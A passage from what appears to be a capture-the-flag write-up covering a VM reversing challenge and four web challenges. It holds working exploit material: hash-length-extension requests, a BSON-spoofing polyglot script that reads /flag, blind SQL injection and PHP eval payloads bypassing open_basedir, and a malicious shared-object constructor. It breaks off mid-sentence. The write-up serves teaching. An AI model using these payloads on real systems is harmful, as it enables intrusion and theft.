id="算法">算法</span></h4><p>两道题的算法都不算难。</p><p>第一题为hill cipher</p><p>第二题可以参考https://projecteuler.net/problem=67，我们需要求出最大和的路径，路径中包含flag。</p><p>可以动态规划从下往上叠加，取相邻两个中的较大的一个，具体参考解题脚本。</p><p>构造数据的时候保证每行与最大值相邻的不会相等，这样排除了多解的情况。</p><h4><span id="源代码">源代码</span></h4><p>vm1.c和vm2.c是两道题的源代码，由于我比较菜，写的也比较仓促，代码质量可能不高。。。</p><p>hill.c和triangle.c是算法的源码</p><p>assembly1.txt和assembly2.txt是vm的汇编代码，我直接从x86汇编翻译过来的。。。</p><p>simulate1.py和simulate2.py是解析bytecode并模拟执行，然后把bytecode写进bytecode1 和bytecode2。</p><p>solve1.py和solve2.py是参考脚本。</p><h4><span id="总结">总结</span></h4><p>虚拟机结构还有很多不足的地方。可以触发的异常比较少，因此指令不能设置太多。没有区分有符号与无符号数，总的来说还是太菜了。</p><p>第二题其实是第一天晚上临时起意改出来的，一开始没准备出两道题。最早不知道可以有修改子进程的方法，后来查了一些资料才了解到的，然后爆肝一晚改出了第二道题。原本第二题只有这一个算法的。。。如果直接放第二题可能效果会更好一点。。。</p><p>有任何问题可以tg联系我 <span class="citation" data-cites="Apeng7364">[@Apeng7364]</span>(https://t.me/Apeng7364)</p><h1><span id="web">web</span></h1><h2><span id="ssrf-me">SSRF Me</span></h2><h4><span id="预期解法">预期解法:</span></h4><p>哈希长度拓展攻击+CVE-2019-9948(urllib)</p><hr><h4><span id="题解">题解:</span></h4><p>代码很简单,主要是有根据传入的action参数判断,有两种模式,一种是请求Param参数的地址,并把结果写入<code>result.txt</code>,另一种是读取<code>result.txt</code>的内容,两种方式都需要<code>sign</code>值校验.并且<code>sign</code>值是通过拼接参数哈希加密,所以可以使用哈希长度拓展攻击.题目给出了<code>scan</code>模式的<code>sign</code>值.</p><ol type="1"><li><p>获取<code>scan</code>模式的<code>sign</code>值. <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /geneSign?param=local-file:flag.txt HTTP/1.1</span><br><span class="line">Host: 139.180.128.86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.15.8</span><br><span class="line">Content-Length: 32</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">51796b52dd6e1108c89b7d5277d3ae0a</span><br></pre></td></tr></table></figure></p></li><li><p>使用<code>hashpump</code>生成新的<code>sign</code>值. <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ hashpump</span><br><span class="line">Input Signature: 51796b52dd6e1108c89b7d5277d3ae0a</span><br><span class="line">Input Data: local-file:flag.txtscan</span><br><span class="line">Input Key Length: 16</span><br><span class="line">Input Data to Add: read</span><br><span class="line">eafd6ccd634ec29886babc843f1d8b86                                                                                        </span><br><span class="line">local-file:flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008\x01\x00\x00\x00\x00\x00\x00read</span><br></pre></td></tr></table></figure></p></li><li><p>把新生成的参数中<code>\x</code>替换成<code>%</code>,然后提交,即可获取flag <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /De1ta?param=local-file:flag.txt HTTP/1.1</span><br><span class="line">Host: 139.180.128.86</span><br><span class="line">Cookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read;sign=eafd6ccd634ec29886babc843f1d8b86</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.15.8</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 65</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;code&quot;: 200, &quot;data&quot;: &quot;de1ctf&#123;27782fcffbb7d00309a93bc49b74ca26&#125;&quot;&#125;</span><br></pre></td></tr></table></figure></p></li></ol><p>由于出题时候的粗心,导致题目产生非预期,太菜了,Orz</p><h2><span id="9calc">9calc</span></h2><h4><span id="part-1">Part 1</span></h4><p>Same to v1 and v2.</p><h4><span id="part-2">Part 2</span></h4><p>The second task is to bypass RegExp <code>/^[0-9a-z\[\]\+\-\*\/ \t]+$/</code>.</p><p>Nestjs is a Nodejs Web Framework which is very similar to Spring, and it's written by TypeScript. However, it's <strong>NOT</strong> Spring. TypeScript is a strongly-typed language, but it's designed for transcompiles to JavaScript so all type definitions will be removed in runtime. We can just ignore <code>expression: string</code> type hinting and pass an object to <code>expression</code>. This time, <code>object.toString() === '[object Object]'</code>.</p><p>But we have no way to let <code>object.toString()</code> become a useful runnable code ─ if frontend and backends communicate by JSON, it's true. I believe that everyone has used MongoDB. Nodejs can pass a JavaScript function to MongoDB, which is not defined in the JSON standard. So they introduce BSON as their data interchange format. This challenge also used BSON. Luckily, we can simulate our object to a BSON object in JavaScript.</p><p>Let's read <code>mongodb/js-bson</code>'s serializer, we can know it detects the object's type by <code>Object[_bsontype]</code> instead of <code>instanceof</code>.</p><p>https://github.com/mongodb/js-bson/blob/master/lib/parser/serializer.js#L756</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (value[<span class="string">'_bsontype'</span>] === <span class="string">'Binary'</span>) &#123;</span><br><span class="line">  index = serializeBinary(buffer, key, value, index, <span class="literal">true</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (value[<span class="string">'_bsontype'</span>] === <span class="string">'Symbol'</span>) &#123;</span><br><span class="line">  index = serializeSymbol(buffer, key, value, index, <span class="literal">true</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (value[<span class="string">'_bsontype'</span>] === <span class="string">'DBRef'</span>) &#123;</span><br></pre></td></tr></table></figure><p>After searching, I found that <code>Symbol</code> is the best type to emulate an object as a string. I checked most of the BSON deserializers and <code>Symbol.toString()</code> always returns the value of the symbol.</p><p>So let's build a Symbol like this:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"expression"</span>:&#123;<span class="attr">"value"</span>:<span class="string">"1+1"</span>,<span class="attr">"_bsontype"</span>:<span class="string">"Symbol"</span>&#125;, <span class="attr">"isVip"</span>: <span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><h4><span id="part-3">Part 3</span></h4><p>Build 3 polyglots in 3 languages to get flag.</p><h4><span id="exp">Exp</span></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>)</span><br><span class="line"><span class="keyword">const</span> url = <span class="string">'http://45.77.242.16/calculate'</span></span><br><span class="line"><span class="keyword">const</span> symbols = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;_'</span>.split(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> payloads = [</span><br><span class="line"><span class="comment">// Nodejs</span></span><br><span class="line"><span class="string">`1 + 0//5 or '''\n//?&gt;\nrequire('fs').readFileSync('/flag','utf-8')[&#123;index&#125;] == '&#123;symbol&#125;' ? 1 : 2;/*&lt;?php\nfunction open()&#123;echo MongoDB\\BSON\\fromPHP(['ret' =&gt; '1']);exit;&#125;?&gt;*///'''`</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">// Python</span></span><br><span class="line"><span class="string">`(open('/flag').read()[&#123;index&#125;] == '&#123;symbol&#125;') + (str(1//5) == 0) or 2 or ''' #\n))//?&gt;\nfunction open()&#123;return &#123;read:()=&gt;'&#123;flag&#125;'&#125;&#125;function str()&#123;return 0&#125;/*&lt;?php\nfunction open()&#123;echo MongoDB\\BSON\\fromPHP(['ret' =&gt; '1']);exit;&#125;?&gt;*///'''`</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">// PHP</span></span><br><span class="line"><span class="string">`len('1') + 0//5 or '''\n//?&gt;\n1;function len()&#123;return 1&#125;/*&lt;?php\nfunction len($a)&#123;echo MongoDB\\BSON\\fromPHP(['ret' =&gt; file_get_contents('/flag')[&#123;index&#125;] == '&#123;symbol&#125;' ? "1" : "2"]);exit;&#125;?&gt;*///'''`</span>,</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"><span class="keyword">const</span> rets = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> checkAnswer = <span class="function">(<span class="params">value</span>) =&gt;</span> axios.post(url, &#123;</span><br><span class="line">expression: &#123;</span><br><span class="line">value,</span><br><span class="line">_bsontype: <span class="string">"Symbol"</span></span><br><span class="line">&#125;,</span><br><span class="line">isVip: <span class="literal">true</span></span><br><span class="line">&#125;).then(<span class="function"><span class="params">p</span> =&gt;</span> p.data.ret === <span class="string">'1'</span>).catch(<span class="function"><span class="params">e</span> =&gt;</span> &#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fn = <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; payloads.length; j++) &#123;</span><br><span class="line"><span class="keyword">const</span> payload = payloads[j]</span><br><span class="line"><span class="keyword">let</span> flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">let</span> index = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; symbols.length; i++) &#123;</span><br><span class="line"><span class="keyword">const</span> ret = <span class="keyword">await</span> checkAnswer(payload.replace(<span class="regexp">/\&#123;flag\&#125;/g</span>, flag + symbols[i]).replace(<span class="regexp">/\&#123;symbol\&#125;/g</span>, symbols[i]).replace(<span class="regexp">/\&#123;index\&#125;/g</span>, index))</span><br><span class="line"><span class="keyword">if</span> (ret) &#123;</span><br><span class="line">flag += symbols[i]</span><br><span class="line"><span class="built_in">console</span>.log(symbols[i])</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">index++</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">rets.push(flag)</span><br><span class="line"><span class="built_in">console</span>.log(rets)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn().then(<span class="function"><span class="params">p</span> =&gt;</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(rets.join(<span class="string">''</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4><span id="others">Others</span></h4><p>In this challenge, the BSON part was inspired by the <code>996Game</code> of <code>*CTF2019</code>. The code of <code>996game</code> is:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GameServer.loadPlayer = <span class="function"><span class="keyword">function</span>(<span class="params">socket,id</span>)</span>&#123;</span><br><span class="line">  GameServer.server.db.collection(<span class="string">'players'</span>).findOne(&#123;<span class="attr">_id</span>: <span class="keyword">new</span> ObjectId(id)&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err,doc</span>)</span>&#123;</span><br></pre></td></tr></table></figure><p>I built <code>{ toHexString: 'aaa', length: 0, id: {length: 12} }</code> to bypass the validation of <code>ObjectId</code> because MongoDB Driver used old version <code>js-bson</code>. This maybe useful in MongoDB injection.</p><h2><span id="giftbox">Giftbox</span></h2><p>以前 1.0 版本 writeup：</p><p><a href="https://github.com/impakho/ciscn2019_giftbox" target="_blank" rel="noopener">impakho/ciscn2019_giftbox</a></p><p>本题是 2.0 版本。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/Giftbox/img/1.png" alt><figcaption>1</figcaption></figure><p>题目页面类似一个网页沙盒。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/Giftbox/img/2.png" alt><figcaption>2</figcaption></figure><p>在源代码 <code>main.js</code> 里找到一个提示，提供了 <code>otp</code> 的 <code>python库</code> 和 <code>totp</code> 的参数，方便写脚本。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/Giftbox/img/3.png" alt><figcaption>3</figcaption></figure><p>同样是 <code>main.js</code> 里，可以找到用来生成 <code>totp</code> 的 <code>key</code> 。</p><p>出题人注：服务端时间与客户端时间相差大于 <code>15秒</code> ，需要先计算正确的 <code>totp</code> 才能调用 <code>shell.php</code> 。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/Giftbox/img/4.png" alt><figcaption>4</figcaption></figure><p>查看 <code>usage.md</code> 可以看到命令用法， <code>login</code> 存在注入，没有过滤，用户名和密码长度限制 <code>100</code>。</p><p>爆破密码脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">import string</span><br><span class="line">import pyotp</span><br><span class="line"></span><br><span class="line">url = &apos;http://127.0.0.1/shell.php?a=%s&amp;totp=%s&apos;</span><br><span class="line">totp = pyotp.TOTP(&quot;GAXG24JTMZXGKZBU&quot;, digits=8, interval=5)</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">length = 0</span><br><span class="line">left = 0x0</span><br><span class="line">right = 0xff</span><br><span class="line">while True:</span><br><span class="line">    mid = int((right - left) / 2 + left)</span><br><span class="line">    if mid == left:</span><br><span class="line">        length = mid</span><br><span class="line">        break</span><br><span class="line">    username = &quot;&apos;/**/or/**/if(length((select/**/password/**/from/**/users/**/limit/**/1))&gt;=%d,1,0)#&quot; % mid</span><br><span class="line">    password = &quot;b&quot;</span><br><span class="line">    payload = &apos;login %s %s&apos; % (username, password)</span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    res = s.get(payload).text</span><br><span class="line">    if &apos;incorrect&apos; in res:</span><br><span class="line">        left = mid</span><br><span class="line">    else:</span><br><span class="line">        right = mid</span><br><span class="line">print(length)</span><br><span class="line"></span><br><span class="line">real_password = &apos;&apos;</span><br><span class="line">for i in range(1, length+1):</span><br><span class="line">    left = 0x20</span><br><span class="line">    right = 0x7e</span><br><span class="line">    while True:</span><br><span class="line">        mid = int((right - left) / 2 + left)</span><br><span class="line">        if mid == left:</span><br><span class="line">            real_password += chr(mid)</span><br><span class="line">            break</span><br><span class="line">        username = &quot;&apos;/**/or/**/if(ascii(substr((select/**/password/**/from/**/users/**/limit/**/1),%d,1))&gt;=%d,1,0)#&quot; % (i, mid)</span><br><span class="line">        password = &quot;b&quot;</span><br><span class="line">        payload = &apos;login %s %s&apos; % (username, password)</span><br><span class="line">        payload = urllib.quote(payload)</span><br><span class="line">        payload = url % (payload, totp.now())</span><br><span class="line">        res = s.get(payload).text</span><br><span class="line">        if &apos;incorrect&apos; in res:</span><br><span class="line">            left = mid</span><br><span class="line">        else:</span><br><span class="line">            right = mid</span><br><span class="line">    print(real_password)</span><br><span class="line">    if len(real_password) &lt; i:</span><br><span class="line">        print(&apos;No.%d char not in range&apos; % i)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/Giftbox/img/5.png" alt><figcaption>5</figcaption></figure><p>得到密码：<code>hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</code></p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/Giftbox/img/6.png" alt><figcaption>6</figcaption></figure><p>密码里提示有个隐藏命令 <code>sh0w_hiiintttt_23333</code> ，可以得到提示 <code>eval</code> 在 <code>launch</code> 的时候被调用。</p><p><code>launch</code> 前需要先用 <code>targeting</code> 设置，不过对输入有限制，这里可以 <code>fuzz</code> 一下，得知 <code>code</code> 限制 <code>a-zA-Z0-9</code> ， <code>position</code> 限制 <code>a-zA-Z0-9})$({_+-,.</code> ，而且两者的长度也有限制。</p><p>这里需要用 <code>php可变变量</code> 构造和拼接 <code>payload</code> 。</p><p>构造用来 <code>getflag</code> 的 <code>payload</code> ，绕过 <code>open_basedir</code> 的限制，写个脚本就能 <code>getflag</code> 。</p><p><code>getflag</code> 脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">import string</span><br><span class="line">import pyotp</span><br><span class="line"></span><br><span class="line">url = &apos;http://127.0.0.1/shell.php?a=%s&amp;totp=%s&apos;</span><br><span class="line">totp = pyotp.TOTP(&quot;GAXG24JTMZXGKZBU&quot;, digits=8, interval=5)</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">def login(password):</span><br><span class="line">    username = &apos;admin&apos;</span><br><span class="line">    payload = &apos;login %s %s&apos; % (username, password)</span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line">def destruct():</span><br><span class="line">    payload = &apos;destruct&apos;</span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line">def targeting(code, position):</span><br><span class="line">    payload = &apos;targeting %s %s&apos; % (code, position)</span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line">def launch():</span><br><span class="line">    payload = &apos;launch&apos;</span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    return s.get(payload).text</span><br><span class="line"></span><br><span class="line">login(&apos;hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;&apos;)</span><br><span class="line">destruct()</span><br><span class="line">targeting(&apos;a&apos;,&apos;chr&apos;)</span><br><span class="line">targeting(&apos;b&apos;,&apos;&#123;$a(46)&#125;&apos;)</span><br><span class="line">targeting(&apos;c&apos;,&apos;&#123;$b&#125;&#123;$b&#125;&apos;)</span><br><span class="line">targeting(&apos;d&apos;,&apos;&#123;$a(47)&#125;&apos;)</span><br><span class="line">targeting(&apos;e&apos;,&apos;js&apos;)</span><br><span class="line">targeting(&apos;f&apos;,&apos;open_basedir&apos;)</span><br><span class="line">targeting(&apos;g&apos;,&apos;chdir&apos;)</span><br><span class="line">targeting(&apos;h&apos;,&apos;ini_set&apos;)</span><br><span class="line">targeting(&apos;i&apos;,&apos;file_get_&apos;)</span><br><span class="line">targeting(&apos;j&apos;,&apos;&#123;$i&#125;contents&apos;)</span><br><span class="line">targeting(&apos;k&apos;,&apos;&#123;$g($e)&#125;&apos;)</span><br><span class="line">targeting(&apos;l&apos;,&apos;&#123;$h($f,$c)&#125;&apos;)</span><br><span class="line">targeting(&apos;m&apos;,&apos;&#123;$g($c)&#125;&apos;)</span><br><span class="line">targeting(&apos;n&apos;,&apos;&#123;$h($f,$d)&#125;&apos;)</span><br><span class="line">targeting(&apos;o&apos;,&apos;&#123;$d&#125;flag&apos;)</span><br><span class="line">targeting(&apos;p&apos;,&apos;&#123;$j($o)&#125;&apos;)</span><br><span class="line">targeting(&apos;q&apos;,&apos;printf&apos;)</span><br><span class="line">targeting(&apos;r&apos;,&apos;&#123;$q($p)&#125;&apos;)</span><br><span class="line">print(launch())</span><br></pre></td></tr></table></figure><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/Giftbox/img/7.png" alt><figcaption>7</figcaption></figure><p>Flag：<code>de1ctf{h3r3_y0uuur_g1fttt_0uT_0f_b0o0o0o0o0xx}</code></p><h2><span id="cloudmusic_rev">CloudMusic_rev</span></h2><p>以前 1.0 版本 writeup：</p><p><a href="https://github.com/impakho/ciscn2019_final_web1" target="_blank" rel="noopener">impakho/ciscn2019_final_web1</a></p><p>本题是 2.0 版本。</p><p>先审计源代码，找到首页备注里有 <code>#firmware</code> 功能。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/CloudMusic_rev/img/1.png" alt><figcaption>1</figcaption></figure><p><code>#firmware</code> 功能需要登录，而且只有管理员有权限访问。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/CloudMusic_rev/img/2.png" alt><figcaption>2</figcaption></figure><p>然后注册登录，在我的分享页面里看到一首英文歌，其它都是中文歌，而且这首英文歌在首页就已经放入到播放器列表里。</p><p>所以看分享 <code>#share</code> 页面源代码，能看到 <code>/media/share.php?</code> 后面还用 <code>btoa</code> 也就是 <code>base64编码</code>，所以这里不难发现有个任意文件读取。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/CloudMusic_rev/img/3.png" alt><figcaption>3</figcaption></figure><p>尝试读取 <code>../index.php</code> 页面的源代码，访问 <code>http://127.0.0.1/media/share.php?Li4vaW5kZXgucGhw</code>。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/CloudMusic_rev/img/4.png" alt><figcaption>4</figcaption></figure><p>限制了 <code>.php</code> 文件，根据提示，可以使用 <code>urlencode</code> 编码绕过。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/CloudMusic_rev/img/5.png" alt><figcaption>5</figcaption></figure><p>成功读取到 <code>../index.php</code> 文件，那么其它文件也可以读取到。</p><p>然后就是读取网站目录下的文件，进行源代码审计。我们的目标就是拿到管理员密码，然后访问 <code>#firmware</code> 功能。</p><p>那么我们需要找到源代码里，哪里读取到管理员密码，这些位置并不多。这里漏洞点在 <code>/include/upload.php</code> 里，调用到 <code>/lib/parser.so</code> 进行音频文件解析，传入了管理员密码。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/CloudMusic_rev/img/6.png" alt><figcaption>6</figcaption></figure><p>那么我们需要用 <code>IDA</code> 反编译 <code>/lib/parser.so</code> 文件，漏洞点在 <code>read_title</code> / <code>read_artist</code> / <code>read_album</code> 三个函数里的 <code>strcpy</code> 处，<code>off by null</code>，刚好可以覆盖到 <code>mem_mframe_data</code> 后面的 <code>mframe_data</code> 第一字节为 <code>0x00</code>，那么读取的时候就能读到 <code>mem_mpasswd</code>，也就是 <code>管理员密码</code>。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/CloudMusic_rev/img/7.png" alt><figcaption>7</figcaption></figure><p>相对于 1.0 版本，这是一个错误版本的 <code>parser.so</code>，因为它使用 <code>strlen</code> 获取字符串长度，致使 <code>unicode</code> 编码的字段无法正常读取，影响到一些 <code>mp3</code> 的信息读取，间接上增加了做题的难度。</p><p>那么我们可以构造字符串长度为 <code>0x70</code> 的字段，然后上传构造好的 <code>mp3</code> 文件，就能读取 <code>管理员密码</code>。</p><p>构造好的 <code>mp3</code> 文件见 <code>exp</code> 里。</p><p>我们使用 <code>管理员密码</code> 登录管理员账号，访问 <code>#firmware</code> 功能。</p><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/CloudMusic_rev/img/8.png" alt><figcaption>8</figcaption></figure><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/CloudMusic_rev/img/9.png" alt><figcaption>9</figcaption></figure><p>泄露这个页面的源代码文件，审计源代码，这里我们可以上传一个 <code>.so</code> 文件，然后猜文件名，然后可以加载这个 <code>.so</code> 文件。</p><p>那么我们可以使用 <code>__attribute__ ((constructor))</code> 来执行我们的代码。</p><p>就像这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">char _version[0x130];</span><br><span class="line">char * version = &amp;_version;</span><br><span class="line"></span><br><span class="line">__attribute__ ((constructor)) void fun()&#123;</span><br><span class="line">    memset(version,0,0x130);</span><br><span class="line">    FILE * fp=popen(&quot;/usr/bin/tac /flag&quot;, &quot;r&quot;);</span><br><span class="line">    if (fp==NULL) return;</span><br><span class="line">    fread(version, 1, 0x100, fp);</span><br><span class="line">    pclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/CloudMusic_rev/img/10.png" alt><figcaption>10</figcaption></figure><p>但是相对于 <code>1.0</code> 版本，这里没有回显。</p><p>所以我们可以向 <code>/uploads/firmware/</code> 或者 <code>/uploads/music/</code> 下写文件，然后去访问来读取到回显信息。</p><p><code>www-data</code> 用户，对 <code>/flag</code> 文件没有读取权限。</p><p>我们需要找到一个具有 <code>suid</code> 权限的程序去读取，<code>/usr/bin/tac</code> 具有 <code>suid</code> 权限，能够读取到 <code>/flag</code> 